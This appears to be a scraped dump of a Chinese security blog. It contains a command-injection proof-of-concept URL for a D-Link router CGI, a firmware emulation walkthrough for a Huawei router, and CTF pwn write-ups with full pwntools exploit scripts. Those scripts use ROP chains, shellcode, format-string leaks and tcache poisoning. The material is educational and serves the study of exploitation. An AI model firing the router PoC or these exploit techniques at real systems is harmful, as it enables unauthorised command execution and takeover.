if(_url.indexOf(&#x27;?&#x27;) == -1) _url += &#x27;?timestamp=&#x27; + new Date().getTime(); else _url += &quot;&amp;timestamp=&quot; + new Date().getTime(); if(this.queryString.length &gt; 0) _url += &quot;&amp;&quot; + this.queryString; this.xmlHttp.open(&quot;GET&quot;, _url, true); /* will make IE11 fail. if(!document.all)&#123; if(_dataType == &quot;xml&quot;) this.xmlHttp.overrideMimeType(&quot;text/xml;charset=utf8&quot;); else this.xmlHttp.overrideMimeType(&quot;text/html;charset=gb2312&quot;);//设定以gb2312编码识别数据 &#125; */ this.xmlHttp.send(null); &#125;, 不难看出其会在url后加上一个参数timestamp 用来记录当前的时间戳 随后拼接完url后发送 我个人认为这一步分析其实没有什么必要 因为在审计完execute_cmd.cgi后我们就可以得到POC如何编写了 POC加上刚才分析的 cmd参数是由第三个字段来的 也就是第二个参数 那么可以直接得到POC http://xxx/cgi-bin/execute_cmd.cgi?aaaa=6&amp;bbbb=ls 注意点在dhttpd文件的分析中 可以看到要成功执行cgi文件还需要先进行登录验证 所以我们需要搭配上CVE-2020-24579才能成功复现该漏洞 这里就不进行讲解 https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/ if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"华为532e漏洞复现","slug":"华为532e漏洞复现","date":"2023-08-09T00:01:57.000Z","updated":"2024-09-20T09:15:40.000Z","comments":true,"path":"2023/08/09/华为532e漏洞复现/","link":"","permalink":"http://example.com/2023/08/09/%E5%8D%8E%E4%B8%BA532e%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"华为532e本次使用的固件是华为532e系列路由器固件下载地址： https://github.com/CcccccccJun/cloud 首先使用binwalk来提取固件 这里要注意一下 如果binwalk没有提取到root文件夹 那么问题出在没有安装相应的文件系统该固件需要安装的是sasquatch 配置好相关环境后可以成功提取到文件随后我们将root目录打包成压缩文件 供等下上传到模拟系统中tar -czvf 1.tar squashfs-root/qemu模拟有多种形式 本次我们使用的是系统模拟 同时通过file观察任意的可执行文件 可以注意到该路由器使用的是MIPS架构为此 我们需要准备MIPS的内核文件以及一个MIPS架构的虚拟机映像文件可以在该网站上下载 https://people.debian.org/~aurel32/qemu/mips/随后我们需要创建一个TUN&#x2F;TAP虚拟网络接口 其可以在操作系统和用户空间之间进行网络数据包的传输 便于我们在虚拟机中连接到启动后的路由器 tunctl -t top0 -u rootifconfig top0 192.168.10.1 我们给予的top0接口的ipv4地址的子网号可以为任意 同时要使用默认网关随后我们利用qemu进行系统模拟qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic为qemu模拟出来的虚拟机增加了一个TAP设备的虚拟网络接口top0用于通信默认的登录账号和密码都是root我们将eth0接口配置和刚才top0接口相同的c段ifconfig eth0 192.169.10.2随后就可以在ubuntu中访问到debian虚拟机随后我们利用scp把刚才打包好的压缩文件上传到debian虚拟机中scp 1.tar root@192.168.10.2:/root/但是这里报错了大概意思是debian虚拟机中的openssh禁用了ssh-dss算法我们需要手动加上参数来允许 scp -oHostKeyAlgorithms=+ssh-dss 1.tar root@192.168.10.2:/root/ 随后回到debian虚拟机 利用tar –zxvf 1.tar 命令进行解压接着我们需要将&#x2F;dev目录与squashfs-root目录进行绑定 使得可以访问到所需的设备文件同理 将&#x2F;proc目录挂载到squashfs-root对应的目录下 mount -o bind /dev ./squashfs-root/devmount -t proc /proc ./squashfs-root/proc/ 随后以squashfs-root目录为根目录 执行shellchroot ./squashfs-root/ sh由于在路由器启动后 eth0接口的ip地址会被更改 所以我们需要在启动路由器的过程中 重新配置eth0接口 这也就意味着我们需要连接两个会话已有的会话是通过qemu模拟后直接生成的虚拟机 不会随着ip的更改而断开 而通过ssh连接的会话会因为ip受到影响于是 我们需要在ssh的会话中启动路由器 随后这个ssh进程就会因为ip改变而卡住 然后我们再通过原本的会话重新配置eth0 就可以成功启动路由器的同时 保证我们的eth0还是原本的ip地址 ./bin/upnp./bin/mic 启动路由器的环境 成功启动后 我们就可以在宿主机中访问到路由器了这里使用360浏览器是因为其他浏览器不支持TLS1.0的协议 导致无法成功访问 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"NssCTF round14","slug":"NssCTF-round14","date":"2023-07-30T08:31:02.000Z","updated":"2023-09-14T17:21:10.000Z","comments":true,"path":"2023/07/30/NssCTF-round14/","link":"","permalink":"http://example.com/2023/07/30/NssCTF-round14/","excerpt":"","text":"love这题可以非预期 但是由于时间比较充裕 就按照出题人的意思来做一做 比较简单的一题 难点在于最后的破坏了tls结构体的时候 不能选择system函数 要用syscall 但是稍微修复一下tls结构体 还是可以调用system函数的 考点在于pthread_create会使得新线程栈的布局迁移到tls结构体附近的一块地址 导致我们可以通过栈溢出覆盖到tls的canary 从而来绕过canary 修复tls结构体只需要把fs:0x10处的值覆盖成addr+0x308后是一个可读的地址即可 自己调一调就可以懂了 完整exp: from pwn import*import pwn_pb2#io = process(&quot;./pwn&quot;)io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;I want to hear your praise of Toka&quot;)payload = &#x27;%520c%9$n%17$p&#x27;# gdb.attach(io,&#x27;b *0x40131B&#x27;)# gdb.attach(io,&#x27;b *0x401290&#x27;)io.send(payload)# pause()io.recvuntil(&quot;\\xc0&quot;)libc_addr = int(io.recv(14),16)-libc.sym[&#x27;__libc_start_main&#x27;]-243success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]fs_base = libc_addr - 0x3900binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))rdi_addr = next(elf.search(asm(&quot;pop rdi;ret&quot;)))ret_addr = next(elf.search(asm(&quot;ret&quot;)))io.recvuntil(&quot;I know you like him, but you must pass my level&quot;)payload = cyclic(0x28)+p64(0x100)+cyclic(0x8)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+cyclic(0x840-0x30-0x28)+cyclic(0x10)+p64(elf.bss(0x200))+cyclic(0x10)+b&#x27;\\x00\\x01\\x00\\x00\\x00\\x00\\x00&#x27;# gdb.attach(io,f&#x27;b *&#123;libc_addr+0x10ca1e&#125;&#x27;)io.sendline(payload)# pause()io.interactive() rbp劫持rbp可以任意写 然后就是打orw 没什么好说的 from pwn import*import pwn_pb2io = process(&quot;./pwn&quot;)#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;try it&quot;)ptr_read = 0x401292bss_addr = elf.bss(0x800)payload = cyclic(0x210)+p64(bss_addr+0x210)+p64(ptr_read)io.send(payload)rdi_addr = next(elf.search(asm(&quot;pop rdi;ret&quot;)))rbp_addr = next(elf.search(asm(&quot;pop rbp;ret&quot;)))leave_addr = next(elf.search(asm(&quot;leave;ret&quot;)))puts_plt = elf.sym[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(rbp_addr)+p64(bss_addr+0x510)+p64(ptr_read)+b&#x27;./flag\\x00\\x00&#x27;+cyclic(0x210-0x38)+p64(bss_addr-0x8)+p64(leave_addr)# gdb.attach(io,&#x27;b *0x4012C0&#x27;)io.send(payload)# pause()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_addr = libc_addr + 0x0000000000142c92read_addr = libc_addr + libc.sym[&#x27;read&#x27;]open_addr = libc_addr + libc.sym[&#x27;open&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]flag_addr = bss_addr+0x30payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x600)+p64(rdx_addr)+p64(0x100)+p64(read_addr)payload += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(bss_addr+0x600)+p64(write_addr)payload = payload.ljust(0x210,b&#x27;\\x00&#x27;)+p64(bss_addr+0x300-0x8)+p64(leave_addr)# gdb.attach(io,&#x27;b *0x4012C0&#x27;)io.send(payload)# pause()io.recv()io.recv() xor 保护全关了 可用的攻击手法变得多元化起来了 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+7h] [rbp-9h] BYREF _BYTE *v5; // [rsp+8h] [rbp-8h] BYREF init(argc, argv, envp); while ( flag &lt;= 0 ) &#123; printf(&quot;addr: &quot;); __isoc99_scanf(&quot;%p&quot;, &amp;v5); printf(&quot;value: &quot;); __isoc99_scanf(&quot; %hhx&quot;, &amp;v4); xorByteWithAddress(v5, v4); &#125; return 0;&#125; 程序的主体逻辑很简单 就是可以向一个任意地址 进行一次单字节的异或的操作 但是由于while循环的条件是flag小于等于0 执行完xorByteWithAddress函数后 flag的值自增 就退出while循环 所以我们首要的思路就是想办法把flag的值修改成负数 随后往bss段上写入shellcode 利用main函数结束会调用隐式exit函数 中间利用call函数调用了fini_array 通过覆盖fini_array就可以调用到shellcode 完整exp: from pwn import*import pwn_pb2io = process(&quot;./pwn&quot;)#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()fini_addr = 0x600970def xor(addr,xor_message): io.recvuntil(&quot;addr: &quot;) got = elf.got[&#x27;printf&#x27;] io.sendline(addr) io.recvuntil(&quot;value: &quot;) # gdb.attach(io,&#x27;b *0x400738&#x27;) io.sendline(xor_message) bss_addr =elf.bss(0x300)shellcode = [&#x27;48&#x27;,&#x27;31&#x27;,&#x27;f6&#x27;,&#x27;56&#x27;,&#x27;48&#x27;,&#x27;bf&#x27;,&#x27;2f&#x27;,&#x27;62&#x27;,&#x27;69&#x27;,&#x27;6e&#x27;,&#x27;2f&#x27;,&#x27;2f&#x27;,&#x27;73&#x27;,&#x27;68&#x27;,&#x27;57&#x27;,&#x27;54&#x27;,&#x27;5f&#x27;,&#x27;6a&#x27;,&#x27;3b&#x27;,&#x27;58&#x27;,&#x27;99&#x27;,&#x27;0f&#x27;,&#x27;05&#x27;]xor(&quot;600BCf&quot;,&quot;ff&quot;)addr = &quot;600ea0&quot;for i in shellcode: xor(addr,i) num = int(addr, 16) num += 1 addr = format(num, &#x27;x&#x27;) print(addr)xor(&quot;600970&quot;,&quot;b0&quot;)xor(&quot;600971&quot;,&quot;8&quot;)xor(&quot;600972&quot;,&quot;20&quot;)# gdb.attach(io,&#x27;b *_dl_fini+524&#x27;)# pause(0)xor(&quot;600Bcf&quot;,&quot;ff&quot;)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"星ctf2023","slug":"星ctf2023","date":"2023-07-29T17:29:23.000Z","updated":"2023-09-14T17:21:08.000Z","comments":true,"path":"2023/07/30/星ctf2023/","link":"","permalink":"http://example.com/2023/07/30/%E6%98%9Fctf2023/","excerpt":"","text":"比赛名应该是*ctf 但是由于我hexo框架不能命名为 * 所以只能叫星了 fcalc 没有开启NX保护 第一反应就是要打shellcode void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123; void *v3; // rsp void *v4; // rsp double *v5; // rbx int v6; // [rsp+14h] [rbp-44h] BYREF int i; // [rsp+18h] [rbp-40h] int j; // [rsp+1Ch] [rbp-3Ch] double *v9; // [rsp+20h] [rbp-38h] void *s; // [rsp+28h] [rbp-30h] void *buf; // [rsp+30h] [rbp-28h] double v12; // [rsp+38h] [rbp-20h] unsigned __int64 v13; // [rsp+40h] [rbp-18h] v13 = __readfsqword(0x28u); v3 = alloca(400LL); s = (16 * ((&amp;v6 + 3) &gt;&gt; 4)); v4 = alloca(64LL); buf = s; memset(s, 0, 0x180uLL); memset(buf, 0, 0x30uLL); qword_40E0 = s; dword_4010 = 0; sub_1384(); say(); while ( 1 ) &#123; v6 = read(0, buf, 0x180uLL); if ( v6 &gt; 47 ) v6 = 48; for ( i = 0; i &lt; v6 &amp;&amp; *(buf + i) != &#x27;\\n&#x27;; ++i ) &#123; if ( *(buf + i) &lt;= 0x20 || *(buf + i) &gt; 0x30 ) &#123; if ( *(buf + i) &gt; 0x2F &amp;&amp; *(buf + i) &lt;= 0x39 ) &#123; if ( dword_4010 &gt; 47 ) &#123; puts(&quot;ERROR&quot;); exit(1); &#125; ++dword_4010; v5 = qword_40E0; *v5 = atof(buf + i); qword_40E0 += 8LL; while ( *(buf + i + 1) == 0x2E || *(buf + i + 1) &gt; 0x2F &amp;&amp; *(buf + i + 1) &lt;= 0x39 ) ++i; &#125; &#125; else // (0x20,0x30] &#123; if ( dword_4010 &lt;= 1 ) &#123; puts(&quot;ERROR&quot;); exit(1); &#125; v9 = s; for ( j = 0; j &lt;= 47; ++j ) &#123; v12 = fabs(*v9); if ( v12 != 0.0 &amp;&amp; (v12 &lt; 1.0 || v12 &gt; 100.0) ) &#123; printf(&quot;ERROR: %lf\\n&quot;, v12); exit(1); &#125; ++v9; &#125; (qword_4060[*(buf + i) - 0x20])(); &#125; &#125; if ( s &lt; qword_40E0 ) printf(&quot;Result: %lf\\n&quot;, *(qword_40E0 - 8)); &#125;&#125; 首先需要逆向出来和菜单交互的格式 我们需要使得dword_4010大于1 同时还要绕过这两个循环 while ( *(buf + i + 1) == 0x2E || *(buf + i + 1) &gt; 0x2F &amp;&amp; *(buf + i + 1) &lt;= 0x39 ) ++i; &#125;for ( j = 0; j &lt;= 47; ++j ) &#123; v12 = fabs(*v9); if ( v12 != 0.0 &amp;&amp; (v12 &lt; 1.0 || v12 &gt; 100.0) ) &#123; printf(&quot;ERROR: %lf\\n&quot;, v12); exit(1); &#125; ++v9; &#125; 第一个循环 相对来说容易 只需要在对应字符后面加上超出范围的字符即可 第二个循环限制比较大 对0x48个字长的空间都进行了check 随后呢根据输入的字符 取决调用哪个函数 __int64 (__fastcall *sub_1384())()&#123; __int64 (__fastcall *result)(); // rax setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); qword_4060[0] = printf_nop; qword_4068 = printf_nop; qword_4070 = printf_nop; qword_4078 = printf_nop; qword_4080 = printf_nop; qword_4088 = printf_nop; qword_4090 = printf_nop; qword_4098 = printf_nop; qword_40A0 = printf_nop; qword_40A8 = printf_nop; qword_40B0 = sub_12BB; qword_40B8 = sub_1208 + 1; qword_40C0 = printf_nop; qword_40C8 = sub_1262; qword_40D0 = printf_nop; result = sub_1314; qword_40D8 = sub_1314; return result;&#125; 顺便在main函数的开头 还隐藏着一个buf地址 qword_40E0 = s; 我们通过字符’0’就可以实现call buf 这里就存在了shellcode的调用 由于我们刚才说到的check的存在 我们没办法把shellcode放到payload后面 所以需要通过把shellcode写到不会被check的前面 然后控制rsp寄存器再跳转过去 完整exp: from pwn import*import pwn_pb2io = process(&quot;./pwn&quot;)#io = remote(&quot;47.92.7.93&quot;,8802)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Enter your expression:&quot;)shellcode = &quot;&quot;&quot;add rsp,0x10jmp rsp&quot;&quot;&quot;payload = b&#x27;\\x35\\x40\\x35\\x40\\x30\\x30\\x30\\x30&#x27;+b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&quot;+cyclic(0x21)+p64(0x4014000000000000)*2+asm(shellcode)+b&#x27;\\x40\\x40&#x27;# gdb.attach(io,&#x27;b *$rebase(0x187a)&#x27;)# pause(0)io.send(payload)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"Ciscn2023决赛","slug":"Ciscn2023决赛","date":"2023-07-26T04:51:33.000Z","updated":"2023-09-14T17:18:46.000Z","comments":true,"path":"2023/07/26/Ciscn2023决赛/","link":"","permalink":"http://example.com/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/","excerpt":"","text":"codelog一道看起来是序列化的简单堆题。。。 被赛方开赛前说的有两题序列化protobuf跟flatbuffers坑了 导致先去看了第三题的正常堆 结果一个数独逆不出来。。。 结果爆零噜 switch ( i ) &#123; case 0: init_code(v16, v3, v4, v5, v6, v7, v18, v19, v20, v21); v18 = v16[0]; v19 = v16[1]; v20 = v16[2]; v21 = v16[3]; check_number = 1; continue; case 1: if ( check_number != 1 ) goto LABEL_13; open_flag(); encode(s1, v3, v8, v9, v10, v11, v18, v19, v20, v21); close_flag(); break; case 2: if ( check_number != 1 ) goto LABEL_13; open_flag(); decode(s1, v3, v12, v13, v14, v15, v18, v19, v20); close_flag(); break; case 3: show_code(s1, v3, v4, v5, v6, v7, v18, v19, v20, v21); continue; case 4: show_tree(v19, 2 * v20 - 1); continue; case 5: add(); continue; case 6: delete(); continue; case 7: show(); continue; case 8: exit(0); default:LABEL_13: puts(&quot;Error!&quot;); break; &#125; 主要的逻辑就是菜单 不过有几个函数起到了一个误导作用 关键的漏洞有两个 一个是init_code函数中存在了一个scanf引起的堆溢出 还有一个是没有开启PIE保护机制 实际其他函数都是一个误导作用 我们只需要利用init_code函数的堆溢出 覆盖tcachebin的fd域 使得申请到bss段上 从而向存放chunk指针的数组写入got表的地址 这样就可以借助show函数把libc地址泄露出来了 随后利用同样的手法打free_hook 唯一要注意的就是init_code本身会对堆构造产生影响 所以需要自己动调注意一下 from pwn import*import pwn_pb2io = process(&quot;./pwn&quot;)#io = remote(&quot;47.92.7.93&quot;,8802)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def Init(size,char,weight): io.recvuntil(&quot;log@code:/root/ $ &quot;) io.sendline(&quot;Init&quot;) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) for i in range(size): io.recvuntil(&quot;char: &quot;) io.sendline(char) io.recvuntil(&quot;weight: &quot;) io.sendline(str(weight))def add(size,log): io.recvuntil(&quot;log@code:/root/ $ &quot;) io.sendline(&quot;Add_log&quot;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;log: &quot;) io.sendline(log)def delete(index): io.recvuntil(&quot;log@code:/root/ $ &quot;) io.sendline(&quot;Delete_log&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;log@code:/root/ $ &quot;) io.sendline(&quot;Print_log&quot;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))def Init_much(size,char,weight,char2,weight2): io.recvuntil(&quot;log@code:/root/ $ &quot;) io.sendline(&quot;Init&quot;) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;char: &quot;) io.sendline(char) io.recvuntil(&quot;weight: &quot;) io.sendline(str(weight)) io.recvuntil(&quot;char: &quot;) io.sendline(char2) io.recvuntil(&quot;weight: &quot;) io.sendline(str(weight2))Init(2,&#x27;a&#x27;,1)add(0x50,&#x27;aaaa&#x27;)#0add(0x50,&#x27;aaaa&#x27;)#1delete(1)delete(0)puts_got = elf.got[&#x27;puts&#x27;]payload = cyclic(0x10-0x2)+p64(0)+p64(0x21)+cyclic(0x10)+p64(0)+p64(0x21)+cyclic(0x10)+p64(0)+p64(0x61)+p64(0x405230)Init_much(2,&#x27;a&#x27;,1,payload,1)add(0x50,&#x27;aaaa&#x27;)#0add(0x50,p64(puts_got))#1show(1)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]add(0x50,&#x27;aaaa&#x27;)#2add(0x50,&#x27;aaaa&#x27;)#3delete(3)delete(2)payload = cyclic(0xe)+p64(0)+p64(0x21)+cyclic(0x10)+p64(0)+p64(0x21)+cyclic(0x10)+p64(0)+p64(0x61)+p64(free_hook)# gdb.attach(io,&#x27;b *0x401AE1&#x27;)# pause(0)Init_much(2,&#x27;a&#x27;,1,payload,1)add(0x50,&#x27;/bin/sh\\x00&#x27;)#2add(0x50,p64(system_addr))delete(2)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"2023巅峰极客","slug":"2023巅峰极客","date":"2023-07-21T07:36:56.000Z","updated":"2023-09-14T17:21:18.000Z","comments":true,"path":"2023/07/21/2023巅峰极客/","link":"","permalink":"http://example.com/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/","excerpt":"","text":"这次比赛难度比较大 只做出了一题 不过哪怕是这一题都有很大的收获 记录一下 linkmap 开启了FULL RELRO 导致got表不可写 这将成为我们后续利用的一大阻碍 __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char buf[16]; // [rsp+0h] [rbp-10h] BYREF sub_40071B(a1, a2, a3); read(0, buf, 0x100uLL); return 0LL;&#125; 程序的主体逻辑非常简单 单单提供了一次栈溢出的机会 不过还给了几个看起来很奇怪的函数 我们发现他们的功能都是可以往bss段写入数据 __int64 __fastcall sub_400606(int a1, int a2, int a3)&#123; __int64 result; // rax __int64 v4; // [rsp+14h] [rbp-8h] v4 = *(_QWORD *)(qword_601040 + a1); qword_601040 = v4; result = (unsigned int)a1; dword_601048 = a1; if ( a2 == 1 ) &#123; result = v4; qword_601028[a3] = v4; &#125; else if ( !a2 ) &#123; result = v4; qword_601020[a3] = v4; &#125; return result;&#125; 重点观察一下上面的函数 前两行我们可以把任意地址的内容写到任意地址上 像这种没有提供输出函数的栈溢出题目 一般都是通过覆盖got表 要么是覆盖setvbuf来获得puts函数 要么是覆盖read函数来获得syscall 但是由于这题开启了got表 一开始我是想打消念头的 但是不知道你还记不记得 在栈的学习初期 我们学过ret2csu 其调用函数时通过call指令来调用的 .text:00000000004007C0 mov rdx, r13.text:00000000004007C3 mov rsi, r14.text:00000000004007C6 mov edi, r15d.text:00000000004007C9 call qword ptr [r12+rbx*8].text:00000000004007CD add rbx, 1.text:00000000004007D1 cmp rbx, rbp.text:00000000004007D4 jnz short loc_4007C0.text:00000000004007D6.text:00000000004007D6 loc_4007D6: ; CODE XREF: init+34↑j.text:00000000004007D6 add rsp, 8.text:00000000004007DA pop rbx.text:00000000004007DB pop rbp.text:00000000004007DC pop r12.text:00000000004007DE pop r13.text:00000000004007E0 pop r14.text:00000000004007E2 pop r15.text:00000000004007E4 retn 这题之所以困扰我们 是因为开启了FULL RELRO导致的got表不可覆盖 那么如果我们利用漏洞函数把read函数的真实地址写到bss段 而bss段是可以写的 我们可以将其覆盖最后一位为syscall 随后利用ret2csu来调用 就可以达到目的 随后我们利用read函数输入0x3b个字节 就可以达到控制rax寄存器 随后设置rdi寄存器和rsi寄存器 最后调用syscall 就可以实现execve(“&#x2F;bin&#x2F;sh”,0) 难点主要在于无法同时进行read控制rax和ret2csu 这样会导致输入的长度过多 我们需要把ret2csu部分的payload单独放到其他内存 然后在控制完rax寄存器后跳转过去 完整exp: from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;pwn-b5c90fa468.challenge.xctf.org.cn&quot;, 9999, ssl=True)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()rdi_addr = 0x00000000004007e3setvbuf_got = elf.got[&#x27;setvbuf&#x27;]ptr_read = 0x400752csu_addr = 0x4007DAcsu2_addr = 0x4007C0main_addr = 0x400740read_addr = elf.sym[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]magic_addr = 0x601030rbp_addr = 0x0000000000400570rsp_addr = 0x00000000004007dda_addr = 0x40067crsi_r15 = 0x00000000004007e1payload = cyclic(0x10)+p64(elf.bss(0x500)+0x10)+p64(ptr_read)sleep(0.5)io.send(payload)payload = cyclic(0x8)+p64(ptr_read)+p64(elf.bss(0x500))+p64(rdi_addr)+p64(read_got)+p64(0x400606)+p64(ptr_read)sleep(0.5)io.send(payload)payload = b&#x27;/bin/sh\\x00&#x27;+cyclic(0x8)+p64(elf.bss(0xa00))+p64(ptr_read)+cyclic(0x10)+b&#x27;\\x90&#x27;sleep(0.5)io.send(payload)payload = cyclic(0x10)+p64(elf.bss(0x800))+p64(ptr_read)+p64(csu_addr)+p64(0)+p64(1)+p64(0x601530)+p64(0)+p64(0)+p64(0x601500)+p64(csu2_addr)sleep(0.5)io.send(payload)payload = cyclic(0x10)+p64(elf.bss(0x800))+p64(read_addr)sleep(0.5)io.send(payload)payload = p64(csu_addr)+cyclic(0x18)+p64(rsp_addr)+p64(elf.bss(0xa00)-0x8)+p64(0)+cyclic(0x3)# gdb.attach(io,&#x27;b *0x4007C9&#x27;)# pause(0)sleep(0.5)io.send(payload)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"MiMalloc","slug":"MiMalloc详解","date":"2023-07-19T06:27:44.000Z","updated":"2023-09-14T17:20:00.000Z","comments":true,"path":"2023/07/19/MiMalloc详解/","link":"","permalink":"http://example.com/2023/07/19/MiMalloc%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"前言在今年的HWS中遇到了一道堆 与往常不同的是 c语言标准库中的malloc分配器更换成了mimalloc 于是打算来了解一下这个分配器 查看一下这个分配器要如何利用 同时由于本人水平不足 对于mimalloc源码的分析不到位 很多地方也是一知半解 只能起到一个面向pwn解题的分析 个人认为相比起用ptmalloc锻炼源码分析能力 mimalloc更加轻量化 更能起到练手的一个效果 编译环境配置本小节用来指引如何在ubuntu中配置c语言调用mimalloc库 如果没有需要自己编译题目来调试的 就不需要看 Microsoft &#x2F; Mimalloc：Mimalloc是一款紧凑的通用分配器，具有出色的性能。 (github.com) 首先git clone库到本地 git clone https://github.com/microsoft/mimalloc.git 随后创建一个目录用来存放构建后的项目 cmake ../mimalloc/makesudo make install 接着是比较麻烦的一步 因为在执行完make install后 官方文档是说会在&#x2F;usr&#x2F;include中安装头文件 但是我实测是没有的 所以我们需要手动把头文件复制到对应目录中 sudo cp -r /home/chen/mimalloc/include/* /usr/include/ 随后我们在使用gcc编译的时候 在后面加上-lmimalloc 就可以成功编译了 gcc -o test ./test.c -lmimalloc 如果需要用到pwndbg进行源码调试的 需要编译.so文件的时候加上-DCMAKE_BUILD_TYPE&#x3D;Debug 参照官方文档 